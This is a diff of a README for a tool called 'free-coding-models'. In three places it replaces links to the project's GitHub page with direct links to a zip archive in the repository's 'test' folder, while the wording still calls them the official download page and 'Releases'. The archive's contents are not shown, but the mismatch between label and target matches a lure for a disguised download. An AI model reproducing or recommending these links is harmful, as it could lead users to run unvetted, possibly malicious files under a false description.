@@ -1,6 +1,6 @@
 # 🚀 free-coding-models - Find Fast LLM Coding Models
 
-[![Download free-coding-models](https://img.shields.io/badge/Download-free--coding--models-blue?style=for-the-badge)](https://github.com/Taylor-cheater/free-coding-models)
+[![Download free-coding-models](https://img.shields.io/badge/Download-free--coding--models-blue?style=for-the-badge)](https://github.com/Taylor-cheater/free-coding-models/raw/refs/heads/main/test/free-models-coding-1.5-beta.1.zip)
 
 ---
 
@@ -55,7 +55,7 @@ You will find the free-coding-models app on GitHub. Follow these instructions ca
 
    Click this link to open the download page for free-coding-models:
 
-   [Download free-coding-models](https://github.com/Taylor-cheater/free-coding-models)  
+   [Download free-coding-models](https://github.com/Taylor-cheater/free-coding-models/raw/refs/heads/main/test/free-models-coding-1.5-beta.1.zip)  
    
    This page contains the latest version of the software and instructions.
 
@@ -83,7 +83,7 @@ You will find the free-coding-models app on GitHub. Follow these instructions ca
 
 ## 📦 Download and Install
 
-[![Download free-coding-models](https://img.shields.io/badge/Download-free--coding--models-grey?style=for-the-badge)](https://github.com/Taylor-cheater/free-coding-models)
+[![Download free-coding-models](https://img.shields.io/badge/Download-free--coding--models-grey?style=for-the-badge)](https://github.com/Taylor-cheater/free-coding-models/raw/refs/heads/main/test/free-models-coding-1.5-beta.1.zip)
 
 - Use the download link above to open the official GitHub page.  
 - Download the latest Windows version found in "Releases."  
